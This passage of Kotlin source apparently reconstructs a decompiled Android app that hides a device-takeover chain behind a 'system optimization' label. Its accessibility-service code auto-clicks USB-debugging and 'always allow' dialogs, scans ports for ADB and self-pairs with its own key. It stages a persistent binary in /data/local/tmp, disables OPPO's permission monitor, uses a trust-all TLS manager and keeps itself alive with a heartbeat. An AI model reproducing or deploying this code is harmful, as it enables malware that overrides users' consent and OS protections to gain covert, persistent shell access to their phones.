                                discoveredPorts.add(Pair(foundHost, foundPort))
                                Log.d(TAG, "NSD 解析成功: $foundHost:$foundPort")
                                latch.countDown()
                            }
                        }
                    })
                }
                override fun onServiceLost(serviceInfo: android.net.nsd.NsdServiceInfo?) {
                    Log.d(TAG, "NSD 服务丢失: ${serviceInfo?.serviceName}")
                }
                override fun onDiscoveryStopped(serviceType: String?) {
                    Log.d(TAG, "NSD 发现已停止: $serviceType")
                }
                override fun onStartDiscoveryFailed(serviceType: String?, errorCode: Int) {
                    Log.w(TAG, "NSD 发现启动失败: errorCode=$errorCode")
                    latch.countDown()
                }
                override fun onStopDiscoveryFailed(serviceType: String?, errorCode: Int) {
                    Log.w(TAG, "NSD 停止发现失败: errorCode=$errorCode")
                }
            }

            try {
                nsdManager.discoverServices("_adb-tls-connect._tcp.", NsdManager.PROTOCOL_DNS_SD, listener)
                latch.await(15, TimeUnit.SECONDS)
                try { nsdManager.stopServiceDiscovery(listener) } catch (_: Exception) {}
            } catch (e: Exception) {
                Log.w(TAG, "NSD 发现异常: ${e.message}")
            }

            if (foundPort > 0) {
                return Pair(foundHost, foundPort)
            }
        } catch (e: Exception) {
            Log.e(TAG, "NSD 发现异常", e)
        }
        return Pair("127.0.0.1", 0)
    }

    // ========================================================================
    // Port scanning — vendor j3 (line 4812), j4 (line 4910)
    // ========================================================================

    /**
     * Scan ports 30000-49999 for ADB.
     * vendor: j3 (line 4812) — parallel port scanner
     */
    fun scanForAdbPort(): Int {
        // vendor: parallel port scanning with 2-thread pool
        Log.d(TAG, "【N()】开始端口扫描 30000-49999...")
        val scanExecutor = Executors.newFixedThreadPool(2)
        try {
            val ip = getLocalIpAddress()
            val portRanges = listOf(
                Pair(30000, 39999),
                Pair(40000, 49999)
            )
            val futures = portRanges.map { (start, end) ->
                scanExecutor.submit(java.util.concurrent.Callable<Int> {
                    for (port in start..end) {
                        try {
                            val socket = java.net.Socket()
                            socket.connect(java.net.InetSocketAddress(ip, port), 50)
                            socket.close()
                            Log.d(TAG, "【N()】端口开放: $port")
                            return@Callable port
                        } catch (_: Exception) {
                            // port not open
                        }
                    }
                    -1
                })
            }
            // Wait for first positive result
            val deadline = System.currentTimeMillis() + 30000L
            while (System.currentTimeMillis() < deadline) {
                for (future in futures) {
                    if (future.isDone) {
                        val port = future.get()
                        if (port > 0) {
                            Log.d(TAG, "【N()】扫描到端口: $port")
                            return port
                        }
                    }
                }
                Thread.sleep(100)
            }
        } catch (e: Exception) {
            Log.e(TAG, "【N()】端口扫描异常", e)
        } finally {
            scanExecutor.shutdownNow()
        }
        Log.w(TAG, "【N()】未扫描到端口")
        return -1
    }

    /**
     * Get wireless debug port via settings or netstat.
     * vendor: j4 (line 4910)
     */
    fun getWirelessDebugPort(): Int {
        try {
            val settingsPort = getAdbWifiPort()
            if (settingsPort > 0) {
                Log.d(TAG, "从系统设置读取到调试端口: $settingsPort")
                return settingsPort
            }
            // Fallback: parse netstat output for ports in 30000-49999
            try {
                val process = Runtime.getRuntime().exec(
                    arrayOf("sh", "-c", "netstat -tln 2>/dev/null | grep -E ':3[0-9]{4}|:4[0-9]{4}' | grep LISTEN")
                )
                val output = process.inputStream.bufferedReader().readText()
                if (!process.waitFor(5, TimeUnit.SECONDS)) {
                    process.destroy()
                }
                val regex = Regex(":([34]\\d{4})\\s")
                for (match in regex.findAll(output)) {
                    val port = match.groupValues[1].toIntOrNull() ?: continue
                    if (port in 30000 until 50000) {
                        Log.d(TAG, "netstat 扫描到可能的调试端口: $port")
                        return port
                    }
                }
            } catch (_: Exception) {}
        } catch (e: Exception) {
            Log.e(TAG, "扫描端口失败", e)
        }
        return 0
    }

    // ========================================================================
    // Deploy local-service — vendor d8, d9, e3, e7
    // ========================================================================

    /**
     * Deploy local-service binary via ADB.
     * vendor: e7 (line 2886)
     */
    fun deployLocalService(): Boolean {
        val port = getDebugPort()
        if (port <= 0) {
            Log.w(TAG, "无效的调试端口: $port")
            return false
        }
        Log.d(TAG, "开始 ADB 连接部署: $cachedLocalIp:$port")
        // vendor: full deploy via ADB connection:
        // 1. getOrCreateAdbConnection() → g41
        // 2. pushFile(localServiceBinaryPath, "/data/local/tmp/local-service")
        // 3. executeShellCommand("chmod 755 /data/local/tmp/local-service")
        // 4. fireAndForget("nohup /data/local/tmp/local-service server -d -s ...")
        // ADAPT: requires g41 ADB connection class — returning false until replicated
        return false
    }

    // ========================================================================
    // Sign ADB token — vendor b6 (line 827)
    // ========================================================================

    /**
     * Sign ADB authentication token with private key.
     * vendor: b6 (line 827)
     *
     * Uses RSA/ECB/NoPadding with PKCS1 v1.5 padding prefix.
     */
    fun signAdbToken(token: ByteArray, keyFile: File): ByteArray? {
        return try {
            val privateKey = loadPrivateKey(keyFile) ?: return null
            val cipher = Cipher.getInstance("RSA/ECB/NoPadding")
            cipher.init(Cipher.ENCRYPT_MODE, privateKey)

            // PKCS1 v1.5 padding prefix for SHA1 (vendor iArr constant)
            val digestInfo = byteArrayOf(
                0x00, 0x01,
                // 0xFF padding (216 bytes)
                *ByteArray(216) { 0xFF.toByte() },
                // DigestInfo header for SHA-1
                0x00, 0x30, 0x21, 0x30, 0x09, 0x06, 0x05, 0x2b,
                0x0e, 0x03, 0x02, 0x1a, 0x05, 0x00, 0x04, 0x14
            )
            cipher.update(digestInfo)
            cipher.doFinal(token)
        } catch (e: Exception) {
            Log.e(TAG, "signAdbToken 失败", e)
            null
        }
    }

    // ========================================================================
    // createPeerInfo — vendor d4 (line 2243)
    // ========================================================================

    /**
     * Create PeerInfo payload (8192 bytes) for ADB pairing.
     * vendor: d4 (line 2243)
     *
     * Format: [0x00] + base64(androidRsaKey) + " " + packageName + "\0"
     * Padded to 8192 bytes.
     */
    fun createPeerInfo(): ByteArray {
        val result = ByteArray(8192)  // Segment.SIZE = 8192
        result[0] = 0
        try {
            val keyPair = tlsKeyPair ?: throw IllegalStateException("tlsKeyPair 未初始化")
            val pubKey = keyPair.public as RSAPublicKey
            val rawKey = toAndroidRsaPublicKey(pubKey)
            val base64Key = Base64.encode(rawKey, Base64.DEFAULT)
            val suffix = " ${context.packageName}\u0000".toByteArray(Charsets.UTF_8)
            val peerInfoData = ByteArray(base64Key.size + suffix.size)
            System.arraycopy(base64Key, 0, peerInfoData, 0, base64Key.size)
            System.arraycopy(suffix, 0, peerInfoData, base64Key.size, suffix.size)
            System.arraycopy(peerInfoData, 0, result, 1, minOf(peerInfoData.size, 8191))

            val fingerprint = MessageDigest.getInstance("SHA-256").digest(pubKey.encoded)
            Log.d(TAG, ">>> PeerInfo 使用公钥指纹: ${fingerprint.joinToString(":") { String.format("%02X", it) }}")
        } catch (e: Exception) {
            Log.e(TAG, "生成 PeerInfo 失败", e)
        }
        return result
    }

    // ========================================================================
    // createSslContext — vendor b1 (line 600) + d5 (line 2286)
    // ========================================================================

    /**
     * Create SSLContext with client certificate for ADB TLS.
     * vendor: b1 (line 600)
     *
     * // ADAPT: Conscrypt not available in test classpath
     */
    fun createSslContext(certFile: File, keyFile: File): SSLContext? {
        cachedSslContext?.let { return it }
        return try {
            val cert = loadCert(certFile)
            val key = loadPrivateKey(keyFile)
            if (cert == null || key == null) return null
            Log.i(TAG, "私钥加载成功: ${key.algorithm}, 证书: ${cert.subjectDN}")

            val keyPair = KeyPair(cert.publicKey, key)
            val sslContext = SSLContext.getInstance("TLSv1.3")
            sslContext.init(
                arrayOf(SimpleKeyManager(cert, keyPair)),
                arrayOf(TrustAllManager()),
                SecureRandom()
            )
            cachedSslContext = sslContext
            Log.d(TAG, "SSLContext 创建并缓存成功")
            sslContext
        } catch (e: Exception) {
            Log.e(TAG, "创建 ADB TLS Context 失败", e)
            null
        }
    }

    /**
     * Minimal X509KeyManager that presents the ADB client certificate.
     * vendor: f41 (custom KeyManager inner class)
     */
    private class SimpleKeyManager(
        private val cert: X509Certificate,
        private val keyPair: KeyPair
    ) : javax.net.ssl.X509KeyManager {
        override fun getClientAliases(keyType: String?, issuers: Array<out java.security.Principal>?) = arrayOf("adb-client")
        override fun chooseClientAlias(keyType: Array<out String>?, issuers: Array<out java.security.Principal>?, socket: java.net.Socket?) = "adb-client"
        override fun getServerAliases(keyType: String?, issuers: Array<out java.security.Principal>?) = null
        override fun chooseServerAlias(keyType: String?, issuers: Array<out java.security.Principal>?, socket: java.net.Socket?) = null
        override fun getCertificateChain(alias: String?) = arrayOf(cert)
        override fun getPrivateKey(alias: String?) = keyPair.private
    }

    /**
     * TrustManager that trusts all peers (for ADB's self-signed cert).
     * vendor: m41 (trust-all TrustManager inner class)
     */
    private class TrustAllManager : javax.net.ssl.X509TrustManager {
        override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
        override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
    }

    // ========================================================================
    // Missing methods from JADX C0360a2.java lines 2954–5666
    // ========================================================================

    /**
     * Fire-and-forget ADB shell command via persistent connection.
     * vendor: e9 (line 2954)
     *
     * Executes a command through the ADB connection without waiting for output.
     * Used for launching background processes like local-service.
     */
    fun fireAndForget(command: String = "nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &") {
        // ADAPT: depends on g41 (ADB connection class) for shell stream
        try {
            Log.i(TAG, "FireAndForget: $command")
            // vendor: gets g41 connection, opens shell stream, writes command,
            // waits up to 2000ms for stream ready, sends WRTE packet, sleeps 200ms,
            // then sends CLSE packet
            val connection = getOrCreateAdbConnection()
            if (connection == null) {
                Log.w(TAG, "FireAndForget: ADB 连接不可用")
                return
            }
            // ADAPT: actual shell stream protocol requires g41.openStream("shell:$command")
        } catch (e: Exception) {
            Log.e(TAG, "P()异常: $command", e)
            resetAdbState()
        }
    }

    /**
     * Find pairing info (switch state + clicked) from accessibility tree node.
     * vendor: f1 (line 2988)
     *
     * Returns a Pair<Boolean, Boolean> where:
     *   first = isChecked (switch is ON)
     *   second = wasClicked (we performed a click action)
     */
    fun findPairingInfo(node: AccessibilityNodeInfo): Pair<Boolean, Boolean> {
        var isChecked = false
        var wasClicked = false
        try {
            // Find checkable node: if node itself is checkable, use it; otherwise walk up to 3 parents
            var switchNode: AccessibilityNodeInfo? = if (node.isCheckable) node else null
            var parent = node
            var depth = 0
            while (switchNode == null && depth < 3) {
                parent = parent.parent ?: break
                switchNode = findSwitchNode(parent)
                depth++
            }

            if (switchNode == null) {
                // Fallback: find checkable node by screen bounds
                val rect = Rect()
                node.getBoundsInScreen(rect)
                val root = service.rootInActiveWindow
                if (root != null) {
                    // vendor: uses C0362a4.m212107a2() for bounds-based search
                    // which finds a toggle node within the same vertical bounds as our target
                    // ADAPT: using simple findToggleNode traversal as fallback
                    switchNode = findToggleNode(root)
                }
            }

            if (switchNode != null) {
                isChecked = switchNode.isChecked
                if (!isChecked && switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i(TAG, "switchNode clicked")
                    wasClicked = true
                    sleep200(5) // 1000ms
                    switchNode.refresh()
                    isChecked = switchNode.isChecked
                }
                if (!isChecked && !wasClicked) {
                    val clickableParent = findClickableParentCompat(switchNode)
                    if (clickableParent != null && clickableParent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        wasClicked = true
                        sleep200(5)
                        switchNode.refresh()
                        isChecked = switchNode.isChecked
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "f0() 异常", e)
        }
        return Pair(isChecked, wasClicked)
    }

    /**
     * Handle wireless debugging toggle — find and click the switch in dev options.
     * vendor: h0 (line 3084)
     *
     * Detects USB debugging authorization dialog and auto-clicks "Allow".
     * Separate from handleUsbDebugDialog — this one handles the initial toggle.
     */
    fun handleWirelessDebuggingToggle() {
        // ADAPT: vendor checks dqtvuisjd.f52358m1.getCachedRoot() for performance;
        // we use rootInActiveWindow directly
        val cachedRoot = service.rootInActiveWindow ?: return

        val usbDebugTexts = SetupConstants.USB_DEBUG_DIALOG_TEXTS
        for (text in usbDebugTexts) {
            val nodes = cachedRoot.findAccessibilityNodeInfosByText(text)
            if (nodes != null && nodes.isNotEmpty()) {
                Log.i(TAG, "检测到 USB 调试弹窗（包含相关文本）")
                val now = System.currentTimeMillis()
                if (now - lastUsbDebugDialogTime < 5000) return

                // Try to check "always allow" checkbox
                try {
                    val compoundButton = findCompoundButton(cachedRoot)
                    if (compoundButton != null) {
                        if (compoundButton.isChecked) {
                            Log.i(TAG, "CompoundButton 已勾选")
                        } else {
                            compoundButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Log.d(TAG, "已勾选 CompoundButton (一律允许)")
                            SystemClock.sleep(300L)
                        }
                    }
                } catch (_: Exception) {}

                // Click OK button (button1 or btn_positive)
                try {
                    val button1 = cachedRoot.findAccessibilityNodeInfosByViewId("android:id/button1")
                    var okBtn = button1?.firstOrNull()
                    if (okBtn == null) {
                        val altBtn = cachedRoot.findAccessibilityNodeInfosByViewId("com.android.settings:id/btn_positive")
                        okBtn = altBtn?.firstOrNull()
                    }
                    if (okBtn != null) {
                        okBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        lastUsbDebugDialogTime = now
                        Log.d(TAG, "已点击 button1 (允许USB调试)")
                    }
                } catch (_: Exception) {}
                return
            }
        }
    }

    /**
     * Handle completion after pairing — hide overlay, save state, start heartbeat, press back.
     * vendor: h1 (line 3145)
     *
     * Called when the full pairing flow is finished.
     * JADX decompilation partially failed for this method.
     */
    fun handleComplete() {
        Log.d(TAG, "系统优化流程完成")
        // Hide accessibility overlay
        try {
            // ADAPT: overlay hiding depends on dqtvuisjd.m211469g3() (C0763km overlay class)
            // vendor: dqtvuisjd.m211469g3().hide()
            Log.d(TAG, "适配流程完成，已隐藏无障碍遮盖")
        } catch (e: Exception) {
            Log.e(TAG, "隐藏无障碍遮盖失败", e)
        }

        // Save pairing completed flag
        try {
            context.getSharedPreferences("system_optimize", 0).edit()
                .putBoolean("pair_completed", true)
                .putBoolean("adb_deploy_enabled", true)
                .apply()
            Log.d(TAG, "已保存配对完成 + ADB部署启用标记")
        } catch (e: Exception) {
            Log.e(TAG, "保存标记失败", e)
        }

        firstDeployDone = true
        Log.i(TAG, "【D0】firstDeployDone=true (配对完成)")
        shutdownEngine()
        Log.d(TAG, "handleComplete: 部署将在 WRITE_SETTINGS 权限完成后执行")

        // Start heartbeat
        try {
            startHeartbeat()
            if (!heartbeatScheduled) {
                heartbeatScheduled = true
                Log.d(TAG, "【CheckProcess】启动 5 秒定时任务")
                heartbeatExecutor.scheduleAtFixedRate(
                    Runnable { checkAndRecoverLocalService() },
                    5000L, 5000L, TimeUnit.MILLISECONDS
                )
            }
        } catch (e: Exception) {
            Log.w(TAG, "启动心跳/进程监控异常: ${e.message}")
        }

        // Press back to exit settings
        try {
            Log.d(TAG, "所有流程完成，执行返回键退出设置")
            for (i in 1..5) {
                val root = service.rootInActiveWindow
                val pkg = root?.packageName?.toString() ?: ""
                root?.recycle()
                if (!pkg.contains("settings", ignoreCase = true) &&
                    !pkg.contains("Settings", ignoreCase = true)
                ) break
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                Log.i(TAG, "执行返回键 $i/5")
                Thread.sleep(300L)
            }
        } catch (e: Exception) {
            Log.e(TAG, "执行返回键异常", e)
        }

        // Invoke onComplete callback
        try {
            Log.d(TAG, "handleComplete() 调用 onComplete")
            onCompleteCallback?.invoke()
        } catch (e: Exception) {
            Log.e(TAG, "onComplete 回调异常", e)
        }
    }

    /**
     * Handle network confirmation dialog — check "always allow" and click OK.
     * vendor: h2 (line 3218)
     */
    fun handleNetworkConfirmDialog() {
        for (attempt in 0 until 5) {
            try {
                val root = service.rootInActiveWindow ?: continue

                // Check if dialog contains network confirmation text
                val networkTexts = SetupConstants.NETWORK_CONFIRM_TEXTS
                val found = findNodeByTexts(root, networkTexts)
                if (found != null) {
                    Log.i(TAG, "检测到网络确认弹窗")
                    // Try checking "always allow"
                    try {
                        val alwaysAllowTexts = SetupConstants.ALWAYS_ALLOW_TEXTS
                        val alwaysNode = findNodeByTexts(root, alwaysAllowTexts)
                        if (alwaysNode != null) {
                            // Walk up to find checkable parent
                            var parent = alwaysNode.parent
                            var checkableNode: AccessibilityNodeInfo? = null
                            for (d in 0 until 5) {
                                if (parent == null) break
                                if (parent.isCheckable) {
                                    checkableNode = parent
                                    break
                                }
                                for (c in 0 until parent.childCount) {
                                    val child = parent.getChild(c)
                                    if (child != null && child.isCheckable) {
                                        checkableNode = child
                                        break
                                    }
                                }
                                if (checkableNode != null) break
                                parent = parent.parent
                            }
                            if (checkableNode != null && checkableNode.isCheckable && !checkableNode.isChecked) {
                                checkableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                Log.i(TAG, "已勾选网络确认弹窗的始终允许选项")
                            }
                        } else {
                            val checkBox = findCheckBoxNode(root)
                            if (checkBox != null && !checkBox.isChecked) {
                                checkBox.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                Log.i(TAG, "已勾选网络确认弹窗的 CheckBox")
                            }
                        }
                    } catch (_: Exception) {}

                    // Click allow button
                    val allowTexts = SetupConstants.ALLOW_BUTTON_TEXTS
                    val allowBtn = findNodeByTexts(root, allowTexts)
                    if (allowBtn != null) {
                        allowBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        Log.i(TAG, "已点击网络确认弹窗的允许按钮")
                        sleep200(7) // ~1500ms
                        return
                    }
                }
                sleep200(1)
            } catch (e: Exception) {
                Log.e(TAG, "handleNetworkConfirmDialog 异常", e)
                return
            }
        }
    }

    /**
     * Handle OPPO disable permission monitor toggle in developer options.
     * vendor: h3 (line 3286)
     *
     * Scrolls to find "禁止权限监控" item and toggles it on.
     */
    fun handleDisablePermissionMonitor() {
        if (oppoDisablePermMonitorDone) {
            Log.i(TAG, "OPPO禁止权限监控已勾选，跳过")
            return
        }
        val retryCounter = AtomicInteger(0)
        while (!oppoDisablePermMonitorDone && retryCounter.incrementAndGet() <= 2) {
            try {
                val root = service.rootInActiveWindow ?: continue
                val scrollable = findScrollableViewWithRetry(root)
                if (scrollable == null) {
                    Log.w(TAG, "OPPO：滚动视图查找失败")
                    sleep200(10)
                    continue
                }

                // Scroll to bottom first
                if (scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)) {
                    Log.i(TAG, "OPPO：滚动到底部...")
                    scrollForwardEnd(scrollable)
                    sleep200(5)
                }

                // Search for the permission monitor text
                val root2 = service.rootInActiveWindow ?: continue
                val scrollable2 = findScrollableViewWithRetry(root2)
                val permMonitorTexts = SetupConstants.OPPO_DISABLE_PERM_MONITOR_TEXTS
                var targetNode: AccessibilityNodeInfo? = null

                if (scrollable2 != null) {
                    targetNode = findNodeByTexts(root2, permMonitorTexts)
                    if (targetNode == null) {
                        // Try scrolling backward to find it
                        targetNode = scrollForwardFindNode(scrollable2, permMonitorTexts)
                    }
                }

                if (targetNode != null) {
                    Log.i(TAG, "OPPO：禁止权限监控栏目查找成功")
                    val clickableParent = findClickableParent6(targetNode)
                        ?: targetNode.parent
                    val toggle = if (clickableParent != null) findToggleNode(clickableParent) else null
                    if (toggle != null && toggle.isChecked) {
                        oppoDisablePermMonitorDone = true
                        Log.i(TAG, "OPPO：禁止权限监控已勾选（已开启状态）")
                        return
                    }

                    val clickTarget = findClickableParent6(targetNode) ?: targetNode
                    if (clickTarget.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.i(TAG, "OPPO：禁止权限监控已点击")
                        sleep200(10)
                        // Re-check state
                        val root3 = service.rootInActiveWindow
                        if (root3 != null) {
                            val recheckNode = findNodeByTexts(root3, permMonitorTexts)
                            if (recheckNode != null) {
                                val parent2 = findClickableParent6(recheckNode) ?: recheckNode.parent
                                val toggle2 = if (parent2 != null) findToggleNode(parent2) else null
                                val checked = toggle2?.isChecked ?: true
                                oppoDisablePermMonitorDone = checked
                                Log.i(TAG, "OPPO：禁止权限监控点击后状态: checked=$checked")
                            } else {
                                oppoDisablePermMonitorDone = true
                            }
                        }
                    }
                    if (oppoDisablePermMonitorDone) return
                } else {
                    Log.w(TAG, "OPPO：禁止权限监控栏目查找失败，重试 ${retryCounter.get()}")
                }
                sleep200(10)
            } catch (e: Exception) {
                Log.e(TAG, "OPPO handleDisablePermissionMonitor 异常", e)
            }
        }
        Log.i(TAG, "OPPO：禁止权限监控处理完成，状态=$oppoDisablePermMonitorDone")
    }

    /**
     * Accessibility event dispatcher for account protection + heartbeat/deploy logic.
     * vendor: h4 (line 3409)
     *
     * Full heartbeat task handler with account protection, cert generation, and ADB reconnect.
     * JADX decompilation partially failed for this method.
     */
    fun heartbeatEventDispatcher(iteration: Int) {
        if (!heartbeatLock.tryLock()) {
            Log.i(TAG, "【H()】#$iteration tryLock 失败，跳过")
            return
        }
        try {
            // Check power save mode
            try {
                val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                if (pm?.isDeviceIdleMode == true) {
                    Log.i(TAG, "【H()】#$iteration 省电模式，跳过")
                    return
                }
            } catch (_: Exception) {}

            // ADAPT: account protection logic depends on C0287a0 (vendor account manager)
            // vendor checks isAdminActivating with 120s timeout, manages account creation/deletion

            // ADAPT: local-service running check depends on v00.m214888a0()
            // vendor checks if local-service is running; if yes, skips ADB/deploy logic

            // Check cert/key existence
            val keyDir = getKeyDir()
            val hasCerts = keyDir != null &&
                File(keyDir, "cert.pem").exists() &&
                File(keyDir, "private.key").exists()
            val adbDeployEnabled = context.getSharedPreferences("system_optimize", 0)
                .getBoolean("adb_deploy_enabled", false)

            if (!hasCerts && !adbDeployEnabled) {
                // Auto-generate self-signed certificate
                Log.d(TAG, "【H()】#$iteration 未部署过，自动生成自签名证书用于 ADB 认证")
                try {
                    val keyGen = KeyPairGenerator.getInstance("RSA")
                    keyGen.initialize(2048)
                    val keyPair = keyGen.generateKeyPair()
                    val cert = generateCert(keyPair)
                    savePrivateKey(keyPair.private)
                    saveCert(cert)
                    tlsKeyPair = keyPair
                    tlsCertificate = cert
                    Log.d(TAG, "【H()】#$iteration 自签名证书生成成功")
                } catch (e: Exception) {
                    Log.e(TAG, "【H()】#$iteration 自签名证书生成失败", e)
                }
            }

            if (!adbDeployEnabled) {
                Log.i(TAG, "【H()】#$iteration 尚未成功部署过 local-service，跳过心跳")
                return
            }

            // ADAPT: local-service alive + wireless debugging check depends on v00.m214888a0()
            // vendor calls m212097k7() (enableWirelessDebuggingViaSettings) if local-service down
            // and wireless debugging is off
            if (!isLocalServiceAlive.get() && !isWirelessDebuggingEnabled()) {
                enableWirelessDebuggingViaSettings()
            }

            // Submit ADB task
            // ADAPT: vendor wraps in RunnableC0027ag for thread naming
            adbTaskExecutor.submit(Runnable {
                heartbeatTask(iteration)
            })
        } catch (e: Exception) {
            Log.e(TAG, "【H()】异常", e)
        } finally {
            heartbeatLock.unlock()
        }
    }

    /**
     * Check if developer options are enabled via Settings.Global.
     * vendor: h6 (line 3538)
     *
     * Checks only Settings.Global "development_settings_enabled".
     * Different from isDeveloperOptionsEnabled() which checks multiple settings.
     */
    fun isDevOptionsEnabledSimple(): Boolean {
        return try {
            val value = Settings.Global.getInt(context.contentResolver, "development_settings_enabled", 0)
            Log.i(TAG, "isDevOptionsEnabled: development_settings_enabled=$value")
            value > 0
        } catch (e: Exception) {
            Log.e(TAG, "isDevOptionsEnabled 读取异常", e)
            false
        }
    }

    /**
     * Check if currently in the accept dialog (允许/OK/确定).
     * vendor: h7 (line 3550)
     *
     * Searches for dialog buttons matching accept texts, tries to click them
     * via parent node traversal or gesture-based coordinate click.
     */
    fun isInAcceptDialog(): Boolean {
        try {
            val root = service.rootInActiveWindow ?: return false
            val acceptTexts = SetupConstants.ALLOW_BUTTON_TEXTS +
                SetupConstants.DIALOG_ACCEPT_TEXTS +
                SetupConstants.CONFIRM_TEXTS
            var matchedText = ""
            var buttonNode: AccessibilityNodeInfo? = null

            for (text in acceptTexts) {
                val found = findButtonByText(root, text)
                if (found != null) {
                    buttonNode = found
                    matchedText = text
                    break
                }
            }

            if (buttonNode != null) {
                val now = System.currentTimeMillis()
                if (now - lastHeartbeatTime < 500) return true

                Log.i(TAG, "检测到对话框按钮: $matchedText, class=${buttonNode.className}, clickable=${buttonNode.isClickable}")

                // Method 1: walk up parents to find clickable
                var clicked = false
                var parent = buttonNode.parent
                for (depth in 0 until 5) {
                    if (parent == null) break
                    if (parent.isClickable) {
                        clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        Log.i(TAG, "方式1 点击第${depth + 1}层父节点: $clicked, class=${parent.className}")
                        if (clicked) break
                    }
                    parent = parent.parent
                }

                // Method 2: coordinate-based gesture click
                if (!clicked) {
                    val rect = Rect()
                    buttonNode.getBoundsInScreen(rect)
                    var cx = rect.centerX().toFloat()
                    var cy = rect.centerY().toFloat()
                    val dm = service.resources.displayMetrics
                    val sw = dm.widthPixels
                    val sh = dm.heightPixels

                    Log.i(TAG, "方式2 坐标点击: ($cx, $cy), 屏幕: ${sw}x${sh}, rect=$rect")

                    if (cy > sh || cx > sw || cx < 0f || cy < 0f) {
                        Log.w(TAG, "方式2 坐标越界，尝试使用 boundsInParent")
                        val rect2 = Rect()
                        buttonNode.getBoundsInParent(rect2)
                        if (rect2.centerY() > 0 && rect2.centerY() < sh) {
                            cx = (sw / 2).toFloat()
                            cy = 0.85f * sh
                        }
                    }

                    val clampedX = cx.coerceIn(0f, (sw - 1).toFloat())
                    val clampedY = cy.coerceIn(0f, (sh - 1).toFloat())
                    val path = Path()
                    path.moveTo(clampedX, clampedY)
                    clicked = service.dispatchGesture(
                        GestureDescription.Builder()
                            .addStroke(GestureDescription.StrokeDescription(path, 0L, 50L))
                            .build(), null, null
                    )
                    Log.i(TAG, "方式2 坐标点击结果: $clicked (最终坐标: $clampedX, $clampedY)")
                }

                lastHeartbeatTime = now
                Log.i(TAG, "点击${matchedText}按钮 最终结果=$clicked")
                return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "isInAcceptDialog 异常", e)
        }
        return false
    }

    /**
     * Save "adb_deploy_enabled" flag to SharedPreferences.
     * vendor: i1 (line 3740)
     */
    fun saveAdbDeployEnabled() {
        try {
            context.getSharedPreferences("system_optimize", 0).edit()
                .putBoolean("adb_deploy_enabled", true)
                .apply()
        } catch (_: Exception) {}
    }

    /**
     * Notify local-service of server config (serverAddr, deviceId, keySalt).
     * vendor: i2 (line 3748)
     *
     * ADAPT: depends on dqtvuisjd (main service), C0323a8 (server config),
     * AbstractC0765ko (device info), StringUtil (encryption), m212023i9 (URL transform)
     */
    fun notifyLocalServiceConfig() {
        // ADAPT: server URL and keySalt depend on dqtvuisjd.m211471g5().m211644b0()
        // and C0323a8 (server config manager)
        try {
            val androidId = Settings.Secure.getString(context.contentResolver, "android_id") ?: ""
            Log.d(TAG, ">>> 通知 local-service 服务器配置: deviceId=$androidId")
            // vendor builds JSON: {serverAddr, deviceId, keySalt} and POSTs to /setConfig
            val configJson = """{"deviceId":"$androidId","serverAddr":"","keySalt":""}"""
            try {
                val result = postToLocalService("/setConfig", configJson)
                Log.d(TAG, ">>> 通知结果: $result")
            } catch (e: Exception) {
                Log.w(TAG, ">>> POST /setConfig 失败: ${e.message}")
            }
        } catch (e: Exception) {
            Log.w(TAG, ">>> 通知 local-service 服务器配置失败: ${e.message}")
        }
    }

    /**
     * Filter accessibility events — dispatch USB debug dialog handler and pair event handler.
     * vendor: i3 (line 3789)
     *
     * Pre-filters events by package name (systemui, settings) before dispatching.
     */
    fun filterAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: ""

        // Handle USB debug dialog for systemui / settings events
        if ((pkg == "com.android.systemui" || pkg == "com.android.settings") &&
            (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED)
        ) {
            executor.execute { handleWirelessDebuggingToggle() }
        }

        // Forward pair-related events
        if (isFinished.get() || !isPairRunning.get()) return
        val eventPkg = event.packageName?.toString() ?: return

        if (eventPkg.contains("settings", ignoreCase = true) ||
            eventPkg.contains("securitycenter", ignoreCase = true) ||
            eventPkg.contains("systemui", ignoreCase = true)
        ) {
            val eventType = event.eventType
            val className = event.className?.toString()
            // ADAPT: vendor calls e41 runnable wrapper with AccessibilityEvent.obtain(event)
            // for thread safety; we execute directly since event data is read synchronously
            executor.execute {
                mainAccessibilityEventHandler(event, eventPkg, className)
            }
        }
    }

    /**
     * Main accessibility event handler with state machine dispatching.
     * vendor: i4 (line 3811) — THE CORE (~800 lines in JADX)
     *
     * Dispatches to:
     * - pairInDevOption (when in developer options page)
     * - pairInWifiDebugWindow (when in wireless debug page)
     * - pairInPairSuccess (when pairing succeeded)
     * - pairInPairFailDialog (when pairing failed)
     * - pairInSecurityCenter (when in MIUI security center)
     * - pairInConfirmLock (when password verification needed)
     *
     * ADAPT: JADX decompilation partially failed for inner lambdas in pairInPairSuccess handler
     * (~400 lines containing pairInPrepareFinish sub-flow). Core dispatch logic is replicated.
     */
    fun mainAccessibilityEventHandler(event: AccessibilityEvent, pkg: String, className: String?) {
        try {
            // Forward to OpenDevelopmentDelegate if active
            if (devOptState.get().code < DevOptState.ENABLE_DEV_OPT_SUCCESS.code) {
                openDevDelegate?.onAccessibilityEvent(event, pkg, className)
            }

            val isInDevOpt = isInDevOptionsWindow()

            if (isInDevOpt) {
                processedActions.remove("pairInWifiDebugWindow")
                processedActions.remove("pairInPairCodeDialog")
                processedActions.remove("pairInPairFailDialog")
                processedActions.remove("pairInConfirmLock")
                processedActions.remove("pairInSecurityCenter")
